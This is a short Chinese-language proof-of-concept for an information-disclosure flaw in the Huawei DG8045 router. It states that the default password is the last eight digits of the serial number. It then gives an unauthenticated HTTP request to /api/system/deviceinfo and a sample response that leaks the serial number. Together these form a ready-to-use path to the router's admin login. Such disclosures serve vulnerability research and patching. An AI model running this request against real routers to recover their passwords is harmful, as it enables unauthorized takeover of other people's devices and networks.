华为路由器敏感信息泄露--DG8045 Router 1.0



# 概述

路由器默认密码是序列号的最后8位



# poc

### 请求

```shell
GET /api/system/deviceinfo HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0)
Gecko/20100101 Firefox/65.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://192.168.1.1/
X-Requested-With: XMLHttpRequest
Connection: close
```

### 响应

```c
HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Date: Thu, 24 Jun 2021 02:07 GMT+2
Connection: Keep-Alive
Content-Language: en
Content-Type: application/javascript
Content-Length: 141

while(1); /*{"DeviceName":"DG8045","SerialNumber":"21530369847SK9252081","ManufacturerOUI":"00E0FC","UpTime":81590,"HardwareVersion":"VER.A"}*/
```

